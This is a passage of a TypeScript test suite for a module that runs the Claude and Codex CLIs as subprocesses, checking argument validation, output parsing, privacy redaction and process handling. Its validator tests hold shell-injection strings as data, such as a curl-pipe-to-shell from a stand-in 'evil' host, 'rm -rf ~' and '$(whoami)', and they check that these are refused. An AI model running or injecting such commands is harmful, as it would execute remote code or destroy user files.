/**
 * Tests for `externalAdvisor.ts` — the real `claude -p` / `codex exec`
 * subprocess behind `consult_advisor`.
 *
 * Three layers, deliberately:
 *
 *   1. PURE fixtures, ported verbatim from `src-tauri/src/commands/external.rs`'s
 *      own `#[cfg(test)]` module (`cli_slug_rejects_anything_that_could_break_
 *      out_of_the_shell_word`, `parse_claude_json_result_*`,
 *      `parse_codex_json_stream_*`, `embedded_codex_is_ephemeral_read_only_
 *      and_room_scoped`), so a divergence from the Rust behavior shows up here
 *      rather than only in a "the function exists" smoke test.
 *   2. REAL SUBPROCESS: a fake `claude`/`codex` shell script on a scratch
 *      `PATH`, driven through a genuine `child_process.spawn` of a genuine
 *      POSIX shell running the exact command line this module builds — real
 *      stdin write, real stdout/stderr capture, real exit codes, real
 *      SIGTERM-on-cancel, real spawn failure, real files written to and
 *      removed from a real scratch directory. Only the SHELL is swapped
 *      (`/bin/sh -c` for the production `zsh -ilc`): an interactive login
 *      shell sources the user's whole `.zshrc`, which is slow, can trigger
 *      this repo's already-documented macOS TCC prompt loop, and could
 *      PREPEND a directory that shadows the fake with the real,
 *      account-billed `claude` — a cloud call this suite must never make by
 *      accident. That the DEFAULT really is `zsh -ilc` is pinned separately,
 *      against an injected spawn function, in "the production shell".
 *   3. WIRING: `execTool.ts`'s `withRealAdvisorCli`, driven through the real
 *      `execTool` dispatch. `execTool.test.ts` already proves
 *      `execConsultAdvisor`'s own logic (budget cap, question validation,
 *      engine choice, error-to-Ok recovery) exhaustively against an injected
 *      seam; this file adds only what the wiring changed.
 */

import { EventEmitter } from "node:events";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { PassThrough } from "node:stream";
import { afterEach, describe, expect, it } from "vitest";

import { createToolEffects, execTool, withRealAdvisorCli, type ExecToolDeps } from "./execTool.js";
import {
  CODEX_ARCELLE_FLAGS,
  adaptMcpBridge,
  buildCommandLine,
  checkCliSlug,
  makeRunAdvisorCli,
  parseClaudeJsonResult,
  parseCodexJsonStream,
  realRunAdvisorCli,
  runAdvisorCli,
  runExternalCli,
  type AdvisorBridge,
  type AdvisorPrivacyPolicy,
  type AdvisorSpawnFn,
  type AdvisorSpawnedProcess,
  type RunExternalOptions,
} from "./externalAdvisor.js";
import { McpBridge, type ToolCallResult, type ToolDispatcher, type ToolScope, type ToolSpec } from "./mcpBridge.js";
import { clearPolicy, setPolicyRulesForTests } from "./privacy.js";
import type { PrivacyReport } from "./privacyRedact.js";
import type { SidecarChatMessage } from "./sidecar.js";
import { splitExternalModel } from "./turnContext.js";

const userMsg = (content: string, images?: string[]): SidecarChatMessage =>
  images === undefined ? { role: "user", content } : { role: "user", content, images };

/** A real 1x1 PNG, standard base64 with canonical padding. */
const TINY_PNG_B64 =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";

// ============================================================================
// 1. Pure fixtures, from external.rs's own test module
// ============================================================================

describe("checkCliSlug", () => {
  it("accepts the values the picker really produces", () => {
    for (const good of ["gpt-5.6-sol", "opus", "claude-opus-4-8", "high", "xhigh", "gpt-oss:120b"]) {
      expect(checkCliSlug(good, "model")).toBe(good);
    }
  });

  it("treats absent and empty alike as 'no model chosen'", () => {
    expect(checkCliSlug(undefined, "model")).toBeNull();
    expect(checkCliSlug(null, "model")).toBeNull();
    // "codex-cli::" — a tail that is there but empty means "no model".
    expect(checkCliSlug("", "model")).toBeNull();
  });

  it("rejects every room-file shell-injection attempt, naming the field", () => {
    for (const evil of [
      "x'; curl http://evil/sh | sh; '",
      "opus' -c 'x",
      "$(whoami)",
      "`id`",
      "a; rm -rf ~",
      "a\nrm -rf ~",
      "-rf",
    ]) {
      expect(() => checkCliSlug(evil, "model")).toThrow(/model/);
    }
  });

  it("a trailing newline cannot smuggle a second line past the anchors", () => {
    // JS's `$` (no `m` flag) matches only at end of input — unlike Perl/Python,
    // where `$` also matches before a final newline and this would pass.
    expect(() => checkCliSlug("opus\n", "model")).toThrow(/model/);
    expect(() => checkCliSlug("opus\nrm -rf ~", "reasoning effort")).toThrow(/reasoning effort/);
  });

  it("caps the length at 64 characters", () => {
    expect(checkCliSlug("a".repeat(64), "model")).toBe("a".repeat(64));
    expect(() => checkCliSlug("a".repeat(65), "model")).toThrow(/model/);
  });
});

describe("CODEX_ARCELLE_FLAGS", () => {
  it("keeps the embedded Codex turn ephemeral, read-only and room-scoped", () => {
    for (const required of [
      "--ignore-user-config",
      "--ephemeral",
      "--sandbox read-only",
      'approval_policy="never"',
      "--disable shell_tool",
      "--disable unified_exec",
      'web_search="disabled"',
    ]) {
      expect(CODEX_ARCELLE_FLAGS).toContain(required);
    }
  });
});

describe("buildCommandLine", () => {
  it("claude: bare, with model+effort, and with an attached mcp config", () => {
    expect(buildCommandLine("claude-cli", { submodel: null, effort: null })).toBe(
      "claude -p --output-format json"
    );
    expect(buildCommandLine("claude-cli", { submodel: "opus", effort: "high" })).toBe(
      "claude -p --output-format json --model 'opus' --effort 'high'"
    );
    expect(
      buildCommandLine("claude-cli", { submodel: null, effort: null, mcpConfigPath: "/tmp/x/mcp-room.json" })
    ).toBe(
      "claude -p --output-format json --mcp-config '/tmp/x/mcp-room.json' --strict-mcp-config " +
        "--allowedTools 'mcp__room__*'"
    );
  });

  it("codex: carries the Arcelle flags, and takes effort as a -c override rather than --effort", () => {
    expect(buildCommandLine("codex-cli", { submodel: null, effort: null })).toBe(
      `codex exec --json${CODEX_ARCELLE_FLAGS} -`
    );
    const withModel = buildCommandLine("codex-cli", { submodel: "gpt-5.6-sol", effort: "high" });
    expect(withModel).toContain("--model 'gpt-5.6-sol'");
    expect(withModel).toContain("-c 'model_reasoning_effort=high'");
    expect(withModel).not.toContain("--effort");
    // The trailing `-` (read the prompt from stdin) stays last, after every flag.
    expect(withModel.endsWith(" -")).toBe(true);
  });
});

describe("parseClaudeJsonResult", () => {
  it("reads text, usage, and sums all three input-token fields", () => {
    // Captured verbatim from a live `claude -p --output-format json`.
    const stdout =
      '{"type":"result","subtype":"success","is_error":false,"result":"pong","usage":{"input_tokens":1,' +
      '"cache_creation_input_tokens":39383,"cache_read_input_tokens":0,"output_tokens":18},"modelUsage":' +
      '{"claude-haiku-4-5-20251001":{"inputTokens":522,"outputTokens":14,"contextWindow":200000},' +
      '"claude-sonnet-5":{"inputTokens":1,"outputTokens":18,"contextWindow":1000000}}}';
    const { text, usage } = parseClaudeJsonResult(stdout);
    expect(text).toBe("pong");
    // 1 + 39383 + 0 — all three count toward context.
    expect(usage.inputTokens).toBe(39384);
    expect(usage.outputTokens).toBe(18);
  });

  it("falls back to plain text on bad JSON", () => {
    const { text, usage } = parseClaudeJsonResult("not json at all");
    expect(text).toBe("not json at all");
    expect(usage.inputTokens).toBeNull();
    expect(usage.outputTokens).toBeNull();
  });

  it("a valid envelope with no `result` string falls back to the raw stdout", () => {
    const { text } = parseClaudeJsonResult('{"type":"result","result":42}');
    expect(text).toBe('{"type":"result","result":42}');
  });

  it("distinguishes 'no usage field' from 'a usage field we could not read'", () => {
    // No key at all — the CLI reported nothing.
    expect(parseClaudeJsonResult('{"result":"hi"}').usage).toEqual({ inputTokens: null, outputTokens: null });
    // Present but unreadable — Rust's `usage_obj.map(...)` still totals it, at 0.
    expect(parseClaudeJsonResult('{"result":"hi","usage":null}').usage).toEqual({
      inputTokens: 0,
      outputTokens: null,
    });
  });

  it("ignores a token count that is not a non-negative integer, like serde's as_u64", () => {
    const { usage } = parseClaudeJsonResult(
      '{"result":"hi","usage":{"input_tokens":1.5,"cache_read_input_tokens":-3,"output_tokens":"12"}}'
    );
    expect(usage.inputTokens).toBe(0);
    expect(usage.outputTokens).toBeNull();
  });
});

describe("parseCodexJsonStream", () => {
  it("reads the last agent message and the turn's usage", () => {
    // Captured verbatim from a live `codex exec --json`.
    const stdout =
      '{"type":"thread.started","thread_id":"x"}\n' +
      '{"type":"turn.started"}\n' +
      '{"type":"item.completed","item":{"id":"item_0","type":"agent_message","text":"pong"}}\n' +
      '{"type":"turn.completed","usage":{"input_tokens":14365,"cached_input_tokens":9984,"output_tokens":5,' +
      '"reasoning_output_tokens":0}}\n';
    const { text, usage } = parseCodexJsonStream(stdout);
    expect(text).toBe("pong");
    expect(usage.inputTokens).toBe(14365);
    expect(usage.outputTokens).toBe(5);
  });

  it("falls back to raw text only when NOT ONE line parsed", () => {
    const { text, usage } = parseCodexJsonStream("garbage, not jsonl");
    expect(text).toBe("garbage, not jsonl");
    expect(usage.inputTokens).toBeNull();
  });

  it("an empty answer from a stream that DID parse is trusted as-is, not replaced by the raw bytes", () => {
    const { text } = parseCodexJsonStream('{"type":"turn.completed","usage":{"input_tokens":7}}\n');
    expect(text).toBe("");
  });

  it("keeps the LAST agent message when several appear, ignoring reasoning items", () => {
    const stdout =
      '{"type":"item.completed","item":{"type":"agent_message","text":"first"}}\n' +
      '{"type":"item.completed","item":{"type":"reasoning","text":"thinking..."}}\n' +
      '{"type":"item.completed","item":{"type":"agent_message","text":"final answer"}}\n';
    expect(parseCodexJsonStream(stdout).text).toBe("final answer");
  });

  it("a later turn.completed carrying no usage object leaves the reported usage intact", () => {
    // Rust guards the assignment with `if let Some(u) = ev.get("usage")`, so a
    // usage-less event must not blank out what an earlier one reported.
    const stdout =
      '{"type":"turn.completed","usage":{"input_tokens":100,"output_tokens":9}}\n' +
      '{"type":"turn.completed"}\n';
    expect(parseCodexJsonStream(stdout).usage).toEqual({ inputTokens: 100, outputTokens: 9 });
  });
});

describe("splitExternalModel (turnContext.ts — the shared copy this module runs on)", () => {
  it("handles the bare, model-only and model+effort forms", () => {
    expect(splitExternalModel("codex-cli")).toEqual(["codex-cli", undefined, undefined]);
    expect(splitExternalModel("codex-cli::gpt-5.6-sol")).toEqual(["codex-cli", "gpt-5.6-sol", undefined]);
    expect(splitExternalModel("codex-cli::gpt-5.6-sol::high")).toEqual(["codex-cli", "gpt-5.6-sol", "high"]);
    expect(splitExternalModel("claude-cli::opus::xhigh")).toEqual(["claude-cli", "opus", "xhigh"]);
    // A local Ollama tag is never split, even though it contains a ":".
    expect(splitExternalModel("qwen3.5:4b")).toEqual(["qwen3.5:4b", undefined, undefined]);
  });

  it("keeps everything past the SECOND separator inside the effort, like Rust's splitn(3)", () => {
    // A dropped tail would hand `checkCliSlug` a clean "high" and silently run
    // an effort the room never asked for — the value must arrive whole so it
    // can be refused.
    expect(splitExternalModel("claude-cli::opus::high::$(id)")).toEqual(["claude-cli", "opus", "high::$(id)"]);
    expect(() => checkCliSlug(splitExternalModel("claude-cli::opus::high::$(id)")[2], "reasoning effort")).toThrow(
      /reasoning effort/
    );
  });
});

// ============================================================================
// 2. REAL subprocess — a fake claude/codex on a scratch PATH
// ============================================================================

const scratchDirs: string[] = [];
const scratchFiles: string[] = [];

afterEach(() => {
  for (const d of scratchDirs.splice(0)) rmSync(d, { recursive: true, force: true });
  for (const f of scratchFiles.splice(0)) rmSync(f, { force: true });
});

function scratchFile(name: string): string {
  const p = path.join(os.tmpdir(), `${name}-${process.pid}-${Math.random().toString(36).slice(2)}.txt`);
  scratchFiles.push(p);
  return p;
}

/**
 * Writes an executable POSIX shell script named `name` into a fresh scratch
 * `bin/` and returns options wired to run it for real: a non-interactive
 * `/bin/sh -c` shell and a `PATH` that puts the fake ahead of `/bin`+`/usr/bin`
 * (so the script's own `cat`/`printf` still resolve).
 */
function fakeCli(name: "claude" | "codex", script: string): RunExternalOptions {
  const dir = mkdtempSync(path.join(os.tmpdir(), "external-advisor-"));
  scratchDirs.push(dir);
  const binDir = path.join(dir, "bin");
  mkdirSync(binDir, { recursive: true });
  const scriptPath = path.join(binDir, name);
  writeFileSync(scriptPath, `#!/bin/sh\n${script}\n`);
  chmodSync(scriptPath, 0o755);
  return {
    shell: { command: "/bin/sh", args: ["-c"] },
    env: { ...process.env, PATH: `${binDir}:/bin:/usr/bin` },
  };
}

const hasPosixShell = existsSync("/bin/sh");

describe.skipIf(!hasPosixShell)("runExternalCli — real subprocess", () => {
  it("spawns the fake claude for real, writes the prompt to its stdin, and parses the JSON envelope back", async () => {
    const capture = scratchFile("claude-stdin");
    const options = fakeCli(
      "claude",
      `cat > "${capture}"\n` +
        `echo '{"type":"result","result":"pong from fake claude","usage":{"input_tokens":1,"output_tokens":2}}'`
    );
    const { text, usage } = await runExternalCli(
      "claude-cli",
      [
        { role: "system", content: "Be terse." },
        userMsg("what is the capital of France?"),
        { role: "tool", content: "a tool result the CLI must never be shown" },
      ],
      options
    );
    expect(text).toBe("pong from fake claude");
    expect(usage).toEqual({ inputTokens: 1, outputTokens: 2 });

    const sent = readFileSync(capture, "utf8");
    expect(sent).toContain("Instructions:\nBe terse.");
    expect(sent).toContain("User: what is the capital of France?");
    expect(sent).toContain("Respond to the last user message. Reply with the answer only.");
    // Rust's `_ => {}`: a "tool" turn contributes nothing to the prompt.
    expect(sent).not.toContain("a tool result the CLI must never be shown");
    // No bridge attached — the MCP paragraph must not appear.
    expect(sent).not.toContain('MCP server named "room"');
  });

  it("spawns the fake codex for real and parses its JSONL stream", async () => {
    const options = fakeCli(
      "codex",
      "cat > /dev/null\n" +
        `echo '{"type":"item.completed","item":{"type":"agent_message","text":"pong from fake codex"}}'\n` +
        `echo '{"type":"turn.completed","usage":{"input_tokens":10,"output_tokens":5}}'`
    );
    const { text, usage } = await runExternalCli("codex-cli", [userMsg("ping")], options);
    expect(text).toBe("pong from fake codex");
    expect(usage).toEqual({ inputTokens: 10, outputTokens: 5 });
  });

  it("a non-zero exit rejects with the CLI's own stderr, real exit code and all", async () => {
    const options = fakeCli("claude", 'cat > /dev/null\necho "boom: no such model" 1>&2\nexit 7');
    await expect(runExternalCli("claude-cli", [userMsg("ping")], options)).rejects.toThrow(
      /claude-cli failed: boom: no such model/
    );
  });

  it("truncates a runaway stderr to 400 characters", async () => {
    const options = fakeCli(
      "claude",
      "cat > /dev/null\nawk 'BEGIN{while(i++<900) printf \"x\"}' 1>&2\nexit 1"
    );
    await expect(runExternalCli("claude-cli", [userMsg("ping")], options)).rejects.toThrow(
      /^claude-cli failed: x{400}$/
    );
  });

  it("a spawn failure (no such shell binary) rejects with 'Could not start', via a REAL async spawn error", async () => {
    const options: RunExternalOptions = {
      shell: { command: path.join(os.tmpdir(), "no-such-shell-binary-xyz"), args: [] },
    };
    await expect(runExternalCli("claude-cli", [userMsg("ping")], options)).rejects.toThrow(
      /Could not start claude-cli/
    );
  });

  /**
   * `exec sleep`, not a plain `sleep`: the signal goes to the process the
   * shell command IS, exactly as in production, where `zsh -ilc "claude …"`
   * execs into `claude` itself. A forked grandchild would survive the kill
   * (and hold the stdout pipe open) — a real limitation this port shares
   * with `run_external`'s own `kill <pid>`, not something either can fix by
   * signalling harder.
   */
  const sleepingCli = (): RunExternalOptions =>
    fakeCli("claude", "cat > /dev/null\nexec sleep 30");

  it("an already-set Stop flag kills the real child instead of waiting out its sleep", async () => {
    const started = Date.now();
    await expect(
      runExternalCli("claude-cli", [userMsg("ping")], { ...sleepingCli(), cancel: { load: () => true } })
    ).rejects.toThrow();
    expect(Date.now() - started).toBeLessThan(5_000);
  });

  it("Stop pressed MID-FLIGHT kills a child that was already running", async () => {
    let cancelled = false;
    const promise = runExternalCli("claude-cli", [userMsg("ping")], {
      ...sleepingCli(),
      cancel: { load: () => cancelled },
    });
    // Long enough that the shell has really exec'd into the sleeping child.
    await new Promise((r) => setTimeout(r, 300));
    const started = Date.now();
    cancelled = true;
    await expect(promise).rejects.toThrow();
    // The child had 30 seconds left to run; only the signal ends it this fast.
    expect(Date.now() - started).toBeLessThan(4_000);
  });

  it("an unknown engine is refused rather than run", async () => {
    await expect(runExternalCli("qwen3.5:4b", [userMsg("ping")])).rejects.toThrow(/Unknown engine/);
    await expect(runExternalCli("openrouter", [userMsg("ping")])).rejects.toThrow(/Unknown engine/);
  });

  it("an unsafe model slug in the room's engine setting is refused before any shell sees it", async () => {
    const options = fakeCli("claude", 'echo \'{"result":"should never run"}\'');
    await expect(
      runExternalCli("claude-cli::x'; rm -rf ~", [userMsg("ping")], options)
    ).rejects.toThrow(/model.*not run/);
  });

  it("a well-formed model and effort really reach the CLI's argv", async () => {
    const capture = scratchFile("claude-argv");
    const options = fakeCli(
      "claude",
      `cat > /dev/null\nfor a in "$@"; do printf '%s\\n' "$a" >> "${capture}"; done\necho '{"result":"ok"}'`
    );
    await runExternalCli("claude-cli::opus::high", [userMsg("ping")], options);
    const argv = readFileSync(capture, "utf8").split("\n").filter(Boolean);
    expect(argv).toContain("--model");
    expect(argv).toContain("opus");
    expect(argv).toContain("--effort");
    expect(argv).toContain("high");
  });

  it("stages attached images in a scratch dir, points the CLI at them, and removes the dir afterwards", async () => {
    const capture = scratchFile("claude-stdin-img");
    const sizeCapture = scratchFile("claude-img-size");
    // `wc -c` on the staged file proves the CLI could really open it: the file
    // existed, at the path the prompt named, while the CLI was running.
    const options = fakeCli(
      "claude",
      `cat > "${capture}"\n` +
        `wc -c < "$(grep -o '/.*attachment-1\\.png' "${capture}" | head -1)" > "${sizeCapture}"\n` +
        `echo '{"result":"ok"}'`
    );
    await runExternalCli("claude-cli", [userMsg("look at this", [TINY_PNG_B64])], options);

    const sent = readFileSync(capture, "utf8");
    expect(sent).toContain("The user attached 1 image(s), saved for you at:");
    expect(sent).toContain("Open and view them before answering.");
    const imgLine = sent.split("\n").find((l) => l.endsWith("attachment-1.png"));
    expect(imgLine).toBeDefined();
    expect(Number(readFileSync(sizeCapture, "utf8").trim())).toBe(Buffer.from(TINY_PNG_B64, "base64").length);
    // And the whole directory — decrypted pixels and all — is gone by the time
    // the call returns.
    expect(existsSync(path.dirname(imgLine as string))).toBe(false);
  });

  it("skips an attachment that is not valid standard base64 rather than writing a corrupt PNG", async () => {
    const capture = scratchFile("claude-stdin-badimg");
    const options = fakeCli("claude", `cat > "${capture}"\necho '{"result":"ok"}'`);
    // Node's own Buffer.from(_, "base64") would silently decode this to
    // garbage; Rust's `if let Ok(bytes)` skips it, so no image is announced.
    await runExternalCli("claude-cli", [userMsg("look at this", ["abcd!!!!"])], options);
    expect(readFileSync(capture, "utf8")).not.toContain("attached");
  });

  it("threads the room's MCP bridge into claude's --mcp-config file, with the bridge's own JSON inside it", async () => {
    const argvCapture = scratchFile("claude-argv-mcp");
    const configCapture = scratchFile("claude-mcp-config");
    const capture = scratchFile("claude-stdin-mcp");
    const options = fakeCli(
      "claude",
      `cat > "${capture}"\n` +
        `for a in "$@"; do printf '%s\\n' "$a" >> "${argvCapture}"; done\n` +
        // Read the config file the module wrote, WHILE it still exists.
        `cfg=$(awk '/^--mcp-config$/{getline; print; exit}' "${argvCapture}")\n` +
        `cat "$cfg" > "${configCapture}"\n` +
        `echo '{"result":"ok"}'`
    );
    const bridge: AdvisorBridge = {
      mcpConfigJson: () =>
        JSON.stringify({ mcpServers: { room: { type: "http", url: "http://127.0.0.1:9/mcp" } } }),
      mcpUrl: () => "http://127.0.0.1:9/mcp",
      token: "test-token",
    };
    await runExternalCli("claude-cli", [userMsg("ping")], { ...options, bridge });

    const argv = readFileSync(argvCapture, "utf8").split("\n").filter(Boolean);
    const i = argv.indexOf("--mcp-config");
    expect(i).toBeGreaterThanOrEqual(0);
    expect(argv[i + 1]).toMatch(/mcp-room\.json$/);
    expect(argv).toContain("--strict-mcp-config");
    expect(argv).toContain("mcp__room__*");
    // The file really existed at spawn time and really held the bridge's JSON.
    expect(JSON.parse(readFileSync(configCapture, "utf8"))).toEqual({
      mcpServers: { room: { type: "http", url: "http://127.0.0.1:9/mcp" } },
    });
    // The bridge also tells the CLI, in the prompt, that the room's tools exist.
    expect(readFileSync(capture, "utf8")).toContain('MCP server named "room"');
    // And the config file is removed with the scratch dir.
    expect(existsSync(argv[i + 1] as string)).toBe(false);
  });

  it("hands codex the bridge over -c overrides, with the token on an ENV VAR that ps cannot read", async () => {
    const argvCapture = scratchFile("codex-argv");
    const envCapture = scratchFile("codex-env");
    const options = fakeCli(
      "codex",
      `cat > /dev/null\n` +
        `for a in "$@"; do printf '%s\\n' "$a" >> "${argvCapture}"; done\n` +
        `printf '%s' "$PR_ROOM_MCP_TOKEN" > "${envCapture}"\n` +
        `echo '{"type":"item.completed","item":{"type":"agent_message","text":"ok"}}'`
    );
    const bridge: AdvisorBridge = {
      mcpConfigJson: () => "{}",
      mcpUrl: () => "http://127.0.0.1:4321/mcp",
      token: "s3cret-token",
    };
    await runExternalCli("codex-cli", [userMsg("ping")], { ...options, bridge });

    // The single quotes are the shell's; the double quotes are Codex's own
    // TOML-override syntax and must survive into the argument.
    const argv = readFileSync(argvCapture, "utf8");
    expect(argv).toContain('mcp_servers.room.url="http://127.0.0.1:4321/mcp"');
    expect(argv).toContain('mcp_servers.room.bearer_token_env_var="PR_ROOM_MCP_TOKEN"');
    // The token itself is NOT an argument…
    expect(argv).not.toContain("s3cret-token");
    // …it arrived through the environment.
    expect(readFileSync(envCapture, "utf8")).toBe("s3cret-token");
  });

  it("applies the privacy door for real over the wire: redacted out, restored back in", async () => {
    const capture = scratchFile("claude-stdin-priv");
    const options = fakeCli("claude", `cat > "${capture}"\necho '{"result":"reply about [Person A]"}'`);
    const reports: PrivacyReport[] = [];
    const policy: AdvisorPrivacyPolicy = {
      redact: (text, r) => {
        reports.push(r);
        r.entitiesHidden += 1;
        r.replacements += 1;
        return text.replaceAll("Ben", "[Person A]");
      },
      restore: (text) => text.replaceAll("[Person A]", "Ben"),
    };
    const { text } = await runExternalCli("claude-cli", [userMsg("Ben asked a question")], {
      ...options,
      activePolicy: () => policy,
    });
    // Restored on the way back — the user reads a normal answer.
    expect(text).toBe("reply about Ben");
    // Redacted on the way OUT — the CLI itself never saw the real name.
    const sent = readFileSync(capture, "utf8");
    expect(sent).toContain("[Person A]");
    expect(sent).not.toContain("Ben");
    // The redactor was handed a real, zeroed `PrivacyReport` to tally into —
    // the same one `privacyRedact.ts`'s own `Redactor` counts through.
    expect(reports).toHaveLength(1);
    expect(reports[0]).toEqual({ entitiesHidden: 1, replacements: 1, imagesBlocked: 0 });
  });

  it("engages the REAL privacy.ts door with nothing injected — the leaf looks it up itself", async () => {
    // No `activePolicy` option at all: `runExternalCli` must consult
    // privacy.ts's own process-wide policy cell, exactly as `run_external`
    // calls `crate::commands::active_policy()`. This is the whole point of the
    // door living in the leaf — a caller cannot forget to pass it.
    const capture = scratchFile("claude-stdin-realdoor");
    const options = fakeCli("claude", `cat > "${capture}"\necho '{"result":"about [Person A]"}'`);
    setPolicyRulesForTests(true, [["Ben Reich", "[Person A]"]]);
    try {
      const { text } = await runExternalCli("claude-cli", [userMsg("Ben Reich asked a question")], options);
      expect(readFileSync(capture, "utf8")).not.toContain("Ben Reich");
      expect(text).toBe("about Ben Reich");
    } finally {
      clearPolicy();
    }
  });

  it("sends real values when the room's door is switched OFF", async () => {
    const capture = scratchFile("claude-stdin-dooroff");
    const options = fakeCli("claude", `cat > "${capture}"\necho '{"result":"ok"}'`);
    // Rules exist, but the switch is off — `activePolicy()` returns null.
    setPolicyRulesForTests(false, [["Ben Reich", "[Person A]"]]);
    try {
      await runExternalCli("claude-cli", [userMsg("Ben Reich asked a question")], options);
      expect(readFileSync(capture, "utf8")).toContain("Ben Reich");
    } finally {
      clearPolicy();
    }
  });

  it("privacyBypass sends the real values even when a policy is active", async () => {
    const capture = scratchFile("claude-stdin-bypass");
    const options = fakeCli("claude", `cat > "${capture}"\necho '{"result":"ok"}'`);
    const policy: AdvisorPrivacyPolicy = {
      redact: (text) => text.replaceAll("Ben", "[Person A]"),
      restore: (text) => text,
    };
    await runExternalCli("claude-cli", [userMsg("Ben asked a question")], {
      ...options,
      activePolicy: () => policy,
      privacyBypass: true,
    });
    expect(readFileSync(capture, "utf8")).toContain("Ben asked a question");
  });

  it("drops attached images under an active privacy policy rather than sending pixels", async () => {
    const capture = scratchFile("claude-stdin-privimg");
    const options = fakeCli("claude", `cat > "${capture}"\necho '{"result":"ok"}'`);
    // Nothing textual needs hiding, but pixels cannot be redacted at all.
    const reports: PrivacyReport[] = [];
    const policy: AdvisorPrivacyPolicy = {
      redact: (text, r) => {
        reports.push(r);
        return text;
      },
      restore: (text) => text,
    };
    await runExternalCli("claude-cli", [userMsg("nothing secret here", [TINY_PNG_B64, TINY_PNG_B64])], {
      ...options,
      activePolicy: () => policy,
    });
    expect(readFileSync(capture, "utf8")).not.toContain("attached");
    expect(reports[0]?.imagesBlocked).toBe(2);
  });

  it("runAdvisorCli is the (engine, question) seam: one user turn in, the CLI's text out", async () => {
    const capture = scratchFile("codex-stdin-seam");
    const options = fakeCli(
      "codex",
      `cat > "${capture}"\necho '{"type":"item.completed","item":{"type":"agent_message","text":"the answer"}}'`
    );
    expect(await runAdvisorCli("codex-cli", "what now?", options)).toBe("the answer");
    expect(readFileSync(capture, "utf8")).toContain("User: what now?");
  });

  it("makeRunAdvisorCli binds its options into an arity-2 seam", async () => {
    const options = fakeCli("claude", 'cat > /dev/null\necho \'{"result":"bound"}\'');
    const seam = makeRunAdvisorCli(options);
    expect(seam.length).toBe(2);
    expect(await seam("claude-cli", "q")).toBe("bound");
  });
});

// ============================================================================
// 2b. A scripted fake process, for what a real shell cannot show
// ============================================================================

class FakeProcess extends EventEmitter implements AdvisorSpawnedProcess {
  readonly stdin = new PassThrough();
  readonly stdout = new PassThrough();
  readonly stderr = new PassThrough();
  killed = false;
  killSignal: NodeJS.Signals | undefined;
  kill(signal?: NodeJS.Signals): boolean {
    this.killed = true;
    this.killSignal = signal;
    queueMicrotask(() => {
      this.stdout.end();
      this.stderr.end();
      this.emit("close", null, "SIGTERM");
    });
    return true;
  }
}

interface SpawnCall {
  command: string;
  args: string[];
  cwd: string;
  env: NodeJS.ProcessEnv;
  /** Everything the module really wrote to the child's stdin — the prompt. */
  stdin: string;
}

function recordingSpawner(reply: string): { spawnFn: AdvisorSpawnFn; calls: SpawnCall[] } {
  const calls: SpawnCall[] = [];
  const spawnFn: AdvisorSpawnFn = (command, args, opts) => {
    const call: SpawnCall = { command, args, cwd: opts.cwd, env: opts.env, stdin: "" };
    calls.push(call);
    const proc = new FakeProcess();
    // Attaching a 'data' listener also resumes the stream, so the 'end' below
    // still fires exactly as it did when this only called `.resume()`.
    proc.stdin.on("data", (c: Buffer | string) => {
      call.stdin += typeof c === "string" ? c : c.toString("utf8");
    });
    proc.stdin.on("end", () => {
      proc.stdout.end(reply);
      proc.stderr.end();
      proc.emit("close", 0, null);
    });
    return proc;
  };
  return { spawnFn, calls };
}

describe("the production shell and working directory", () => {
  const OK = JSON.stringify({ type: "result", result: "ok" });

  it("defaults to a real interactive login zsh, which is the only way a GUI launch finds the CLI on PATH", async () => {
    const { spawnFn, calls } = recordingSpawner(OK);
    await runExternalCli("claude-cli", [userMsg("hi")], { spawnFn });
    expect(calls).toHaveLength(1);
    expect(calls[0]?.command).toBe("zsh");
    expect(calls[0]?.args[0]).toBe("-ilc");
    expect(calls[0]?.args[1]).toBe("claude -p --output-format json");
  });

  it("runs in the system temp dir when nothing was staged, and in the scratch dir when an image was", async () => {
    const { spawnFn, calls } = recordingSpawner(OK);
    await runExternalCli("claude-cli", [userMsg("no images")], { spawnFn });
    expect(calls[0]?.cwd).toBe(os.tmpdir());

    await runExternalCli("claude-cli", [userMsg("has an image", [TINY_PNG_B64])], { spawnFn });
    expect(calls[1]?.cwd).not.toBe(os.tmpdir());
    expect(calls[1]?.cwd).toContain("arcelle-cli-");
    // The scratch dir it ran in does not outlive the call.
    expect(existsSync(calls[1]?.cwd as string)).toBe(false);
  });

  it("does not set the bridge token env var when no bridge is attached", async () => {
    const { spawnFn, calls } = recordingSpawner(OK);
    await runExternalCli("claude-cli", [userMsg("hi")], { spawnFn });
    expect(calls[0]?.env.PR_ROOM_MCP_TOKEN).toBeUndefined();
  });

  it("refuses a room-file injection attempt WITHOUT ever spawning anything", async () => {
    const { spawnFn, calls } = recordingSpawner(OK);
    await expect(
      runExternalCli("claude-cli::x'; curl http://evil/sh | sh; '", [userMsg("hi")], { spawnFn })
    ).rejects.toThrow(/model/);
    expect(calls).toHaveLength(0);
  });

  it("reports a Node spawn 'error' event as 'Could not start <engine>', not as a bare exit code", async () => {
    // Node emits 'error' and THEN 'close' (code -2) for an ENOENT; the error
    // message is the one that must survive.
    const spawnFn: AdvisorSpawnFn = () => {
      const proc = new FakeProcess();
      queueMicrotask(() => {
        proc.emit("error", new Error("spawn zsh ENOENT"));
        proc.emit("close", -2, null);
      });
      return proc;
    };
    await expect(runExternalCli("codex-cli", [userMsg("hi")], { spawnFn })).rejects.toThrow(
      "Could not start codex-cli: spawn zsh ENOENT"
    );
  });

  it("survives a child that dies before reading stdin (EPIPE is not an unhandled error event)", async () => {
    // A real CLI that exits before draining its stdin makes the parent's write
    // fail with EPIPE, delivered as an 'error' EVENT on the pipe. An
    // unlistened-to 'error' event is a process-level uncaught exception — in
    // the Electron main process, that is the whole app going down because a
    // cloud CLI exited early. The failure must arrive through the exit code
    // instead.
    const procs: FakeProcess[] = [];
    const spawnFn: AdvisorSpawnFn = () => {
      const proc = new FakeProcess();
      procs.push(proc);
      queueMicrotask(() => {
        proc.stdin.destroy(new Error("EPIPE"));
        proc.stdout.end();
        proc.stderr.end("died early");
        proc.emit("close", 1, null);
      });
      return proc;
    };
    await expect(runExternalCli("claude-cli", [userMsg("hi")], { spawnFn })).rejects.toThrow(
      "claude-cli failed: died early"
    );
    // Pinned directly, because an unhandled 'error' here escapes the awaited
    // promise entirely: without this the assertion above passes either way and
    // only the test RUNNER notices the uncaught exception.
